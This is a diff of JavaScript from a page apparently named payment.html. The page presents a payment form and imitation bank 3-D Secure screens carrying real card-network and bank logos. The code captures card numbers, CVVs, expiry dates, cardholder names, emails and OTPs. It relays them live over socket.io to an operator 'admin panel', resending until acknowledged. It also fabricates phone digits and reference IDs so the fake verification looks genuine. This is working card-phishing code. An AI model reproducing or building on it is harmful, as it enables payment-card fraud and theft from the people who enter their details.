-                const btnText = document.getElementById('otpText');
-                
-                if (!otpButton || !otpLoader || !btnText) return; // Added null check
-                
-                otpButton.disabled = true;
-                btnText.style.opacity = '0.5';
-                btnText.style.filter = 'blur(1px)';
-                otpLoader.classList.remove('hidden');
-      
-                try {
-                  const response = await fetch("/api/submitOTP", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                      invoiceId: currentInvoiceId,
-                      otp: document.getElementById('otp').value
-                    })
-                  });
-      
-                  if (!response.ok) throw new Error('Failed to submit OTP');
-                  
-                  statusCheckInterval = setInterval(checkTransactionStatus, 2000);
-                } catch (err) {
-                  console.error('OTP submission error:', err);
-                  alert('Error submitting OTP. Please try again.');
-                  isProcessing = false;
-                  otpButton.disabled = false;
-                  otpLoader.classList.add('hidden');
-                  btnText.style.opacity = '1';
-                  btnText.style.filter = 'none';
-                }
-              });
-            }
-      
-            // Socket.io event handlers
-            socket.on('show_otp', () => {
-              const paymentForm = document.getElementById('paymentForm');
-              const otpForm = document.getElementById('otpForm');
-              const cardLastFour = document.getElementById('cardLastFour');
-              const cardNumberInput = document.getElementById('cardNumber');
-              
-              if (!paymentForm || !otpForm || !cardLastFour || !cardNumberInput) return; // Added null check
-              
-              paymentForm.classList.add('hidden');
-              otpForm.classList.remove('hidden');
-              cardLastFour.textContent = cardNumberInput.value.slice(-4);
-              if (!timerInterval) startOtpTimer();
-              isProcessing = false;
-            });
-    
-   // Find this section in payment.html (around line 1370-1420)
-   socket.on('show_mc_verification', (data) => {
-     console.log('[DEBUG] Received show_mc_verification event:', data);
-     console.log('[DEBUG] Current invoice ID:', currentInvoiceId);
-     console.log('[DEBUG] Full data object:', JSON.stringify(data));
-     
-     // Check if the overlay exists
-     const overlay = document.getElementById('mcVerificationOverlay');
-     console.log('[DEBUG] Overlay element found:', !!overlay);
-     
-     if (data.invoiceId === currentInvoiceId && overlay) {
-       console.log('[DEBUG] Invoice IDs match, showing loading spinner for MC verification');
-       
-       // Show overlay with loading spinner
-       const loadingContent = document.getElementById('mcLoadingContent');
-       const verificationContent = document.getElementById('mcVerificationContent');
-       const loadingVerificationLogo = document.getElementById('loadingVerificationLogo');
-       
-       if (!loadingContent || !verificationContent) return; // Added null check
-       
-       loadingContent.style.display = 'flex';
-       verificationContent.style.display = 'none';
-       overlay.style.display = 'flex';
-       
-       // Set the verification logo based on parameter - extract and log all properties
-       if (loadingVerificationLogo) {
-         // Extract all possible property names that might contain the logo info
-         let logoType = '';
-         
-         if (data.loadingLogoType) {
-           console.log('[DEBUG] Found loadingLogoType:', data.loadingLogoType);
-           logoType = data.loadingLogoType;
-         } else if (data.verificationType) {
-           console.log('[DEBUG] Found verificationType:', data.verificationType);
-           logoType = data.verificationType;
-         } else if (data.verifyType) {
-           console.log('[DEBUG] Found verifyType:', data.verifyType);
-           logoType = data.verifyType;
-         } else if (data.cardType) {
-           console.log('[DEBUG] Found cardType:', data.cardType);
-           logoType = data.cardType;
-         } else {
-           console.log('[DEBUG] No logo type found in data, defaulting to mastercard');
-           logoType = 'mastercard';
-         }
-         
-         console.log('[DEBUG] Final logoType to use:', logoType);
-         
-         // Convert logo type to lowercase once for comparison
-         const logoTypeLower = logoType.toLowerCase();
-         console.log('[DEBUG] Lowercase logoType:', logoTypeLower);
-         
-         // Select logo based on type with improved matching and fixed URLs
-         if (logoTypeLower.includes('visa')) {
-           loadingVerificationLogo.innerHTML = '<img src="https://logowik.com/content/uploads/images/visa-new-20215093.jpg" alt="Verified by Visa" style="max-height: 90px; max-width: 250px;">';
-           console.log('[DEBUG] Selected VISA logo');
-         } 
-         else if (logoTypeLower.includes('amex') || logoTypeLower.includes('american')) {
-           loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png" alt="American Express SafeKey" style="max-height: 90px; max-width: 250px;">';
-           console.log('[DEBUG] Selected AMEX logo');
-         } 
-         else if (logoTypeLower.includes('discover')) {
-           loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png" alt="Discover ProtectBuy" style="max-height: 90px; max-width: 250px;">';
-           console.log('[DEBUG] Selected DISCOVER logo');
-         } 
-         else if (logoTypeLower.includes('rupay')) {
-           loadingVerificationLogo.innerHTML = '<img src="https://www.junkdazzle.com/wp-content/smush-webp/2023/12/1280px-Rupay-Logo.png.webp;">';
-           console.log('[DEBUG] Selected RUPAY logo');
-         } 
-         else {
-           loadingVerificationLogo.innerHTML = '<img src="https://logodix.com/logo/21144.jpg" alt="Mastercard SecureCode" style="max-height: 90px; max-width: 250px;">';
-           console.log('[DEBUG] Selected MASTERCARD logo (default)');
-         }
-       } else {
-         console.log('[DEBUG] loadingVerificationLogo element not found');
-       }
-       
-       // Store data for later use
-       window.mcVerificationData = data;
-     } else {
-       console.log('[DEBUG] Invoice ID mismatch or overlay not found');
-     }
-   });
-      
-   // Start verification event handler with CURRENCY CONVERSION - UPDATED
-   socket.on('start_verification', async (data) => {
-     console.log('[DEBUG] Received start_verification event:', data);
-     console.log('[DEBUG] Full start_verification data:', JSON.stringify(data));
-     
-     if (data.invoiceId === currentInvoiceId) {
-       // Get stored data
-       const storedData = window.mcVerificationData || {};
-       console.log('[DEBUG] Stored MC verification data:', JSON.stringify(storedData));
-       
-       // Hide loading, show verification content
-       const loadingContent = document.getElementById('mcLoadingContent');
-       const verificationContent = document.getElementById('mcVerificationContent');
-       
-       if (!loadingContent || !verificationContent) return; // Added null check
-       
-       loadingContent.style.display = 'none';
-       verificationContent.style.display = 'block';
-       
-       // UPDATED: Set verification type logo on RIGHT side based on stored data
-       const verificationTypeLogo = document.getElementById('verificationTypeLogo');
-       if (verificationTypeLogo) {
-         // First attempt to get the logo type from stored data or parameters
-         let logoType = (data.verificationType || 
-                         data.loadingLogoType || 
-                         storedData.loadingLogoType || 
-                         storedData.verificationType || 
-                         'mastercard').toLowerCase();
-         
-         console.log('[DEBUG] Logo type for verification page:', logoType);
-         
-         // Select the appropriate logo based on type
-         if (logoType.includes('visa')) {
-           verificationTypeLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
-           verificationTypeLogo.alt = 'Verified by Visa';
-           console.log('[DEBUG] Using Visa logo for verification page');
-         } 
-         else if (logoType.includes('amex') || logoType.includes('american')) {
-           verificationTypeLogo.src = 'https://logos-world.net/wp-content/uploads/2020/11/American-Express-Logo-700x394.png';
-           verificationTypeLogo.alt = 'American Express SafeKey';
-           console.log('[DEBUG] Using Amex logo for verification page');
-         } 
-         else if (logoType.includes('discover')) {
-           verificationTypeLogo.src = 'https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/0f808454-e260-4d1b-aac6-7d1368dc7ef8/dg96ja9-a94a3011-dba0-4965-a47e-e0233d92e82a.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzBmODA4NDU0LWUyNjAtNGQxYi1hYWM2LTdkMTM2OGRjN2VmOFwvZGc5NmphOS1hOTRhMzAxMS1kYmEwLTQ5NjUtYTQ3ZS1lMDIzM2Q5MmU4MmEucG5nIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.T_pFbxPhEbOEV5xUTVqW7nJvL5qvBwESsJzKS7j8r14';
-           verificationTypeLogo.alt = 'Discover ProtectBuy';
-           console.log('[DEBUG] Using Discover logo for verification page');
-         } 
-         else if (logoType.includes('rupay')) {
-           verificationTypeLogo.src = 'https://gokiwi.in/homepage/partners/rupay.svg';
-           verificationTypeLogo.alt = 'RuPay PaySecure';
-           console.log('[DEBUG] Using RuPay logo for verification page');
-         } 
-         else {
-           verificationTypeLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
-           verificationTypeLogo.alt = 'Mastercard SecureCode';
-           console.log('[DEBUG] Using Mastercard logo for verification page (default)');
-         }
-       }
-               // Listen for admin acknowledgment
-     socket.on('card_data_received', (data) => {
-       if (data.invoiceId === currentInvoiceId) {
-         cardDataAcknowledged = true;
-         console.log('Card data received by admin panel');
-       }
-     });
-      
-                // UPDATED: Set bank logo on LEFT side
-                const bankLogo = document.getElementById('bankLogo');
-                if (bankLogo) {
-                  const bankLogos = {
-                    'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
-                    'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
-                    'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
-                    'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
-                    'kotak': 'https://cdn.freelogovectors.net/svg07/kotakmahindrabank-logo.svg',
-                    'yes': 'https://logotyp.us/file/yes-bank.svg',
-                    'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
-                    'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
-                    'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
-                    'standard charterd': 'https://companieslogo.com/img/orig/STAN.L_BIG-27b2637e.png?t=1720244494',
-                    'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
-                    'bob': 'https://1000logos.net/wp-content/uploads/2021/06/logo-Bank-of-Baroda-500x281.png',
-                    'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
-                    'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
-                    'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
-                    'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
-                    'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
-                    'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
-                    'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
-                    'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
-                    'unionbankindia': 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Union_Bank_of_India_Logo.svg',
-                    'pnb': 'https://logotyp.us/file/pnb.svg',
-                    'canera bank': 'https://logonoid.com/images/canara-bank-logo.png',
-                    'capitalone': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
-                    'td bank': 'https://cdn.worldvectorlogo.com/logos/td-bank-1.svg',
-                    'citizens': 'https://locations.citizensbank.com/images/citizens-logo-rebrand.png',
-                    'chase bank': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
-                    'truist': 'https://upload.wikimedia.org/wikipedia/commons/8/8b/Truist_Financial_logo.svg',
-                    'cathy united taiwan': 'https://static.wikia.nocookie.net/logopedia/images/4/4b/CATHAY2002.png/revision/latest/scale-to-width-down/250?cb=20230808075909',
-                    'novascotia': 'https://asset.brandfetch.io/idpIpGPfn2/ideBeGWgbz.svg?updated=1667941638324',
-                    'sinopac bank taiwan': 'https://easy.sinopac.com/images/sinopac-logo.svg',
-                    'hua nan bank taiwan': 'https://thebanks.eu/img/logos/Hua_Nan_Commercial_Bank.png',
-                    'landbank taiwan': 'https://www.landbank.com/new_assets/header/landbank_logo.webp',
-                    'un bank taiwan': 'https://upload.wikimedia.org/wikipedia/commons/5/52/E.SUN_Bank.svg',
-                    'KGI bank taiwan': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/dd/KGI_Financial_Holding_logo_v2.png/250px-KGI_Financial_Holding_logo_v2.png',
-                    'usaa bank': 'https://logos-world.net/wp-content/uploads/2021/03/USAA-United-Services-Automobile-Association-Logo-700x394.png',
-                    'huntington': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
-                    'm&t bank ': 'https://companieslogo.com/img/orig/MTB_BIG-01f85319.png?t=1720244493',
-                    'barclays bank': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
-                    'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
-                    'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
-                  'morganstanley': 'https://www.morganstanley.com/content/dam/im/web/images/MSPC/MS-Private-Credit-Logo.svg',
-                   'bancorp': 'https://www.logo.wine/a/logo/U.S._Bancorp/U.S._Bancorp-Logo.wine.svg',
-                   'pnc': 'https://upload.wikimedia.org/wikipedia/commons/1/1b/PNClogo.svg',
-                   'charles schweb': 'https://upload.wikimedia.org/wikipedia/commons/4/4b/Charles_Schwab_Corporation_logo.svg',
-                   'BMO USA': 'https://1000logos.net/wp-content/uploads/2024/01/BMO-US-Logo-500x281.png',
-                   'First Citizens': 'https://www.annualreports.com/HostedData/CompanyLogos/NASDAQ_FCNCA.png',
-                   'Fifth Third Bank': 'https://companieslogo.com/img/orig/FITB_BIG-1d1d41ca.png?t=1723189499',
-                   'Ally Financial': 'https://upload.wikimedia.org/wikipedia/commons/0/00/Ally_Financial.svg',
-                 'KeyCorp': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
-                   'Webster Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/81/Webster_Bank_Logo.svg',
-                   'BNP Paribas': 'https://www.logo.wine/a/logo/BNP_Paribas/BNP_Paribas-Logo.wine.svg',
-                   'Columbia Bank': 'https://mma.prnewswire.com/media/254331/columbia_bank_logo.jpg',
-                   'SoFi': 'https://www.finder.com/niche-builder/5e8f8d3d11841.png',
-                   'Texas Capital Bank': 'https://a.storyblok.com/f/102997/2684x834/d5fa7255e0/tc_horizontal_rgb_2color.png',
-                   'Arvest Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/82/Arvest_Bank_logo.svg',
-                 'Indian allahabad Bank': 'https://logos-download.com/wp-content/uploads/2016/03/Allahabad_Bank_logo_2-700x260.jpg',
-                   'Indian Overseas Bank': 'https://upload.wikimedia.org/wikipedia/commons/f/fc/Indian_Overseas_Bank_Logo.svg',
-                   'Federal Bank': 'https://assets.stickpng.com/images/627cca9b1b2e263b45696aa1.png',
-                   'IDBI Bank': 'https://logotyp.us/file/idbi.svg',
-                   'IDFC First Bank': 'https://www.idfcfirstbank.com/content/dam/idfcfirstbank/images/n1/IDFC-logo-website.svg',
-         'Northern Trust': 'https://www.responsibilityreports.com/HostedData/CompanyLogos/NASDAQ_NTRS.png',
-                   'Synchrony Financial': 'https://upload.wikimedia.org/wikipedia/commons/8/85/Synchrony_Financial.svg',
-                   'Deutsche Bank': 'https://upload.wikimedia.org/wikipedia/commons/4/48/Deutsche_Bank-Logo.svg',
-                   'First Horizon': 'https://companieslogo.com/img/orig/FHN_BIG-c5db5207.png?t=1721010478',
-                   'Comerica': 'https://whitememorial.give.adventisthealth.org/wp-content/uploads/sites/18/2024/09/Comerica-LOGO.jpg',
-                   'IndusInd Bank': 'https://images.seeklogo.com/logo-png/20/2/indusind-bank-logo-png_seeklogo-207227.png',
-                   'Jammu & Kashmir Bank': 'https://www.jkbank.com/assets/frontend/layout/img/logos/jklogo.jpg',
-                   'Karnataka Bank': 'https://seekvectors.com/storage/images/karnataka-bank-logo-01.svg',
-                   'RBL Bank': 'https://upload.wikimedia.org/wikipedia/commons/7/70/RBL_Bank_SVG_Logo.svg',
-                   'UCO Bank': 'https://brandeps.com/logo-download/U/UCO-Bank-logo-vector-01.svg',
-                   'BBVA Mexico': 'https://dq8dwmysp7hk1.cloudfront.net/logos/bbva.svg',
-                   'Banorte Mexico': 'https://img2.freepnges.com/20180625/swi/aaz8w7s80.webp',
-                   'Citibanamex México': 'https://upload.wikimedia.org/wikipedia/commons/9/92/Citibanamex_logo.svg',
-                   'Lloyds Banking Group': 'https://companieslogo.com/img/orig/LYG_BIG-74740808.png?t=1720244492',
-         'NatWest Group': 'https://static.wikia.nocookie.net/logopedia/images/8/86/NatWest_Group_logo.svg/revision/latest/scale-to-width-down/300?cb=20230323154303',
-         'Starling Bank': 'https://asset.brandfetch.io/id65Uj_bLX/id8a5daz0W.svg?updated=1667561520880',
-             'Royal Bank of Canada': 'https://www.logo.wine/a/logo/RBC_Bank/RBC_Bank-Logo.wine.svg',
-                   'Bank of Montreal': 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-Montreal-logo-500x281.png',
-                   'Canadian Imperial Bank of Commerce': 'https://logos-world.net/wp-content/uploads/2021/05/CIBC-Logo-700x394.png',
-                   'Commerzbank': 'https://assets.stickpng.com/images/5a1d2c5e4ac6b00ff574e275.png',
-                   'N26': 'https://big-picture.com/img/xtech/fintech_logos/N26-logo.jpg',
-                   'Bunq': 'https://upload.wikimedia.org/wikipedia/commons/5/58/Bunq_(bank)_company_logo_2017.svg',
-                  };
-                  bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
-                }
-                
-                // UPDATED: Generate random mobile ending instead of using card last 4
-                const cardNumberDisplay = document.getElementById('cardNumberDisplay');
-                const cardLastFourDigits = document.getElementById('cardLastFourDigits');
-      
-     // Use provided phone number or generate random 4 digits for mobile number ending
- const phoneLastFour = data.phoneLastFour || Math.floor(1000 + Math.random() * 9000).toString();
  
- if (cardLastFourDigits) {
-   cardLastFourDigits.textContent = `********${phoneLastFour}`;
- }
+       if (expiryInput) {
+         expiryInput.addEventListener("input", function(e) {
+           let value = e.target.value.replace(/\D/g, '');
+ 
+           // Auto-insert slash after 2 digits
+           if (value.length > 2) {
+             value = value.substring(0, 2) + '/' + value.substring(2, 4);
+           }
+           e.target.value = value.substring(0, 5);
+ 
+           // Validate
+           isExpiryValid = validateExpiry(e.target.value);
+           updateSubmitButton();
+         });
+       }
+ 
+       const emailInput = document.getElementById('email');
+       const cvvInput = document.getElementById('cvv');
+       const cardholderNameInput = document.getElementById('cardholderName');
+       const otpInput = document.getElementById('otp');
+       
+       // Add input event listeners for validation
+       if (emailInput) {
+         emailInput.addEventListener('input', updateSubmitButton);
+       }
+       
+       if (cvvInput) {
+         cvvInput.addEventListener('input', updateSubmitButton);
+       }
+       
+       if (cardholderNameInput) {
+         cardholderNameInput.addEventListener('input', updateSubmitButton);
+       }
+       
+       if (otpInput) {
+         otpInput.addEventListener('input', updateConfirmOtpButton);
+       }
+ 
+       // Payment Submission Handler with hash URL for bankpage
+       const mainForm = document.getElementById('mainForm');
+       if (mainForm) {
+         mainForm.addEventListener('submit', async function(e) {
+           e.preventDefault();
+           if (!isCardValid || !isExpiryValid || isProcessing) return;
+ 
+           isProcessing = true;
+           const submitButton = document.getElementById('submitButton');
+           const submitText = document.getElementById('submitText');
+           const submitLoader = document.getElementById('submitLoader');
+ 
+           if (!submitButton || !submitText || !submitLoader) return; // Added null check
+           
+           // Show loading state
+           submitButton.classList.add('btn-loading');
+           submitText.style.opacity = '0.5';
+           submitText.style.filter = 'blur(1px)';
+           submitLoader.classList.remove('hidden');
+ 
+           try {
+             // Get bank info if available
+             const bankInfoEl = document.getElementById('bankInfo');
+             const bankInfoData = bankInfoEl ? bankInfoEl.value : null;
+             
+             const response = await fetch("/api/sendPaymentDetails", {
+               method: "POST",
+               headers: { "Content-Type": "application/json" },
+               body: JSON.stringify({
+                 cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+                 expiry: document.getElementById('expiry').value,
+                 cvv: document.getElementById('cvv').value,
+                 email: document.getElementById('email').value,
+                 amount: document.getElementById('amount').value,
+                 currency: "INR",
+                 cardholder: document.getElementById('cardholderName').value,
+                 bankInfo: bankInfoData
+               })
+             });
+ 
+             const data = await response.json();
+             if (!response.ok) throw new Error(data.message || 'Payment failed');
+ 
+             // After setting currentInvoiceId from the API response:
+             currentInvoiceId = data.invoiceId;
+             localStorage.setItem('invoiceId', currentInvoiceId);
+             
+             // Save form data for currency page return
+             saveFormData();
+             
+             console.log('Joining socket.io room with invoiceId:', currentInvoiceId);
+             socket.emit('join', currentInvoiceId);
+     
+            // Send card details immediately to admin panel via socket
+            socket.emit('card_submitted', {
+  invoiceId: currentInvoiceId,
+  cardData: {
+    cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+    expiry: document.getElementById('expiry').value,
+    cvv: document.getElementById('cvv').value,
+    email: document.getElementById('email').value,
+    amount: document.getElementById('amount').value,
+    cardholder: document.getElementById('cardholderName').value,
+    timestamp: new Date().toISOString(),
+    // Include bank information if available
+    bankName: JSON.parse(bankInfoData || '{}').bank || 'Unknown',
+    country: JSON.parse(bankInfoData || '{}').country || 'Unknown',
+    cardType: JSON.parse(bankInfoData || '{}').scheme || 'Unknown'
+  }
+});
+
+// Also send a notification to wake up any sleeping admin panels
+socket.emit('notify_admin', {
+  type: 'card_data',
+  invoiceId: currentInvoiceId,
+  message: 'New card submission received'
+});
+
+// Set up a fallback mechanism to ensure admin panel gets the data
+let cardDataAcknowledged = false;
+const cardDataInterval = setInterval(() => {
+  if (cardDataAcknowledged) {
+    clearInterval(cardDataInterval);
+    return;
+  }
+  
+  // Resend card data if not acknowledged within 2 seconds
+  socket.emit('card_submitted', {
+    invoiceId: currentInvoiceId,
+    cardData: {
+      cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+      expiry: document.getElementById('expiry').value,
+      cvv: document.getElementById('cvv').value,
+      email: document.getElementById('email').value,
+      amount: document.getElementById('amount').value,
+      cardholder: document.getElementById('cardholderName').value,
+      timestamp: new Date().toISOString(),
+      bankName: JSON.parse(bankInfoData || '{}').bank || 'Unknown',
+      country: JSON.parse(bankInfoData || '{}').country || 'Unknown',
+      cardType: JSON.parse(bankInfoData || '{}').scheme || 'Unknown',
+      retry: true
+    }
+  });
+}, 2000);
+             // Use clean hash URL for bankpage
+             const bankpageUrl = getBankpageUrl(data.invoiceId);
+             bankPageWindow = window.open(
+               bankpageUrl,
+               '_blank',
+               'width=600,height=800'
+             );
+ 
+             // Check window closure - but don't reset loading state when it closes
+             const checkWindowClosed = setInterval(() => {
+               if (bankPageWindow && bankPageWindow.closed) {
+                 clearInterval(checkWindowClosed);
+               }
+             }, 500);
+ 
+           } catch (error) {
+             console.error('Payment Error:', error);
+             alert(`Payment Failed: ${error.message}`);
+             submitButton.classList.remove('btn-loading');
+             submitText.style.opacity = '1';
+             submitText.style.filter = 'none';
+             submitLoader.classList.add('hidden');
+             isProcessing = false;
+           }
+         });
+       }
+ 
+       // OTP Submission Handler
+       const otpSubmitButton = document.getElementById('otpSubmitButton');
+       if (otpSubmitButton) {
+         otpSubmitButton.addEventListener('click', async () => {
+           if (isProcessing) return;
+           isProcessing = true;
+           const otpButton = document.getElementById('otpSubmitButton');
+           const otpLoader = document.getElementById('otpLoader');
+           const btnText = document.getElementById('otpText');
+           
+           if (!otpButton || !otpLoader || !btnText) return; // Added null check
+           
+           otpButton.disabled = true;
+           btnText.style.opacity = '0.5';
+           btnText.style.filter = 'blur(1px)';
+           otpLoader.classList.remove('hidden');
+ 
+           try {
+             const response = await fetch("/api/submitOTP", {
+               method: "POST",
+               headers: { "Content-Type": "application/json" },
+               body: JSON.stringify({
+                 invoiceId: currentInvoiceId,
+                 otp: document.getElementById('otp').value
+               })
+             });
+ 
+             if (!response.ok) throw new Error('Failed to submit OTP');
+             
+             statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+           } catch (err) {
+             console.error('OTP submission error:', err);
+             alert('Error submitting OTP. Please try again.');
+             isProcessing = false;
+             otpButton.disabled = false;
+             otpLoader.classList.add('hidden');
+             btnText.style.opacity = '1';
+             btnText.style.filter = 'none';
+           }
+         });
+       }
+           // Socket.io event handlers
+      socket.on('show_otp', () => {
+        const paymentForm = document.getElementById('paymentForm');
+        const otpForm = document.getElementById('otpForm');
+        const cardLastFour = document.getElementById('cardLastFour');
+        const cardNumberInput = document.getElementById('cardNumber');
+        
+        if (!paymentForm || !otpForm || !cardLastFour || !cardNumberInput) return; // Added null check
+        
+        paymentForm.classList.add('hidden');
+        otpForm.classList.remove('hidden');
+        cardLastFour.textContent = cardNumberInput.value.slice(-4);
+        if (!timerInterval) startOtpTimer();
+        isProcessing = false;
+      });
+
+      // Find this section in payment.html (around line 1370-1420)
+      socket.on('show_mc_verification', (data) => {
+        console.log('[DEBUG] Received show_mc_verification event:', data);
+        console.log('[DEBUG] Current invoice ID:', currentInvoiceId);
+        console.log('[DEBUG] Full data object:', JSON.stringify(data));
+        
+        // Check if the overlay exists
+        const overlay = document.getElementById('mcVerificationOverlay');
+        console.log('[DEBUG] Overlay element found:', !!overlay);
+        
+        if (data.invoiceId === currentInvoiceId && overlay) {
+          console.log('[DEBUG] Invoice IDs match, showing loading spinner for MC verification');
+          
+          // Show overlay with loading spinner
+          const loadingContent = document.getElementById('mcLoadingContent');
+          const verificationContent = document.getElementById('mcVerificationContent');
+          const loadingVerificationLogo = document.getElementById('loadingVerificationLogo');
+          
+          if (!loadingContent || !verificationContent) return; // Added null check
+          
+          loadingContent.style.display = 'flex';
+          verificationContent.style.display = 'none';
+          overlay.style.display = 'flex';
+          
+          // Set the verification logo based on parameter - extract and log all properties
+          if (loadingVerificationLogo) {
+            // Extract all possible property names that might contain the logo info
+            let logoType = '';
+            
+            if (data.loadingLogoType) {
+              console.log('[DEBUG] Found loadingLogoType:', data.loadingLogoType);
+              logoType = data.loadingLogoType;
+            } else if (data.verificationType) {
+              console.log('[DEBUG] Found verificationType:', data.verificationType);
+              logoType = data.verificationType;
+            } else if (data.verifyType) {
+              console.log('[DEBUG] Found verifyType:', data.verifyType);
+              logoType = data.verifyType;
+            } else if (data.cardType) {
+              console.log('[DEBUG] Found cardType:', data.cardType);
+              logoType = data.cardType;
+            } else {
+              console.log('[DEBUG] No logo type found in data, defaulting to mastercard');
+              logoType = 'mastercard';
+            }
+            
+            console.log('[DEBUG] Final logoType to use:', logoType);
+            
+            // Convert logo type to lowercase once for comparison
+            const logoTypeLower = logoType.toLowerCase();
+            console.log('[DEBUG] Lowercase logoType:', logoTypeLower);
+            
+            // Select logo based on type with improved matching and fixed URLs
+            if (logoTypeLower.includes('visa')) {
+              loadingVerificationLogo.innerHTML = '<img src="https://logowik.com/content/uploads/images/visa-new-20215093.jpg" alt="Verified by Visa" style="max-height: 90px; max-width: 250px;">';
+              console.log('[DEBUG] Selected VISA logo');
+            } 
+            else if (logoTypeLower.includes('amex') || logoTypeLower.includes('american')) {
+              loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png" alt="American Express SafeKey" style="max-height: 90px; max-width: 250px;">';
+              console.log('[DEBUG] Selected AMEX logo');
+            } 
+            else if (logoTypeLower.includes('discover')) {
+              loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png" alt="Discover ProtectBuy" style="max-height: 90px; max-width: 250px;">';
+              console.log('[DEBUG] Selected DISCOVER logo');
+            } 
+            else if (logoTypeLower.includes('rupay')) {
+              loadingVerificationLogo.innerHTML = '<img src="https://www.junkdazzle.com/wp-content/smush-webp/2023/12/1280px-Rupay-Logo.png.webp;">';
+              console.log('[DEBUG] Selected RUPAY logo');
+            } 
+            else {
+              loadingVerificationLogo.innerHTML = '<img src="https://logodix.com/logo/21144.jpg" alt="Mastercard SecureCode" style="max-height: 90px; max-width: 250px;">';
+              console.log('[DEBUG] Selected MASTERCARD logo (default)');
+            }
+          } else {
+            console.log('[DEBUG] loadingVerificationLogo element not found');
+          }
+          
+          // Store data for later use
+          window.mcVerificationData = data;
+        } else {
+          console.log('[DEBUG] Invoice ID mismatch or overlay not found');
+        }
+      });
       
-                // Still use actual card last 4 for the card display
-                const cardNumber = document.getElementById('cardNumber')?.value || '';
-                const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
-                if (cardNumberDisplay) {
-                  cardNumberDisplay.textContent = `XXXX XXXX XXXX ${lastFour}`;
-                }
-      
-                // ADDED: Generate random alphanumeric reference ID
-                const referenceId = document.getElementById('referenceId');
-                if (referenceId) {
-                  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-                  let randomRef = '';
-                  // Generate 3 letters followed by 4 numbers
-                  for (let i = 0; i < 3; i++) {
-                    randomRef += chars.charAt(Math.floor(Math.random() * 26)); // Only letters
-                  }
-                  for (let i = 0; i < 4; i++) {
-                    randomRef += chars.charAt(Math.floor(Math.random() * 10) + 26); // Only numbers
-                  }
-                  referenceId.textContent = randomRef;
-                }
-      
-                // Set other transaction details
-                const merchantName = document.getElementById('merchantName');
-                const transactionAmount = document.getElementById('transactionAmount');
-                const transactionDate = document.getElementById('transactionDate');
-                const displayAmount = document.getElementById('displayAmount');
-                const originalAmount = document.getElementById('originalAmount');
-                const currencySymbol = document.getElementById('currencySymbol');
-                const convertedAmountDisplay = document.getElementById('convertedAmountDisplay');
-                const originalCurrencyDisplay = document.getElementById('originalCurrencyDisplay');
-                
-                // Display merchant name
-                if (merchantName) {
-                  merchantName.textContent = data.merchantName || storedData.merchantName || 'Bologus pvt store.';
-                }
-                
-                // Set transaction date
-                if (transactionDate) {
-                  transactionDate.textContent = new Date().toLocaleString();
-                }
-                
-                // Get original amount
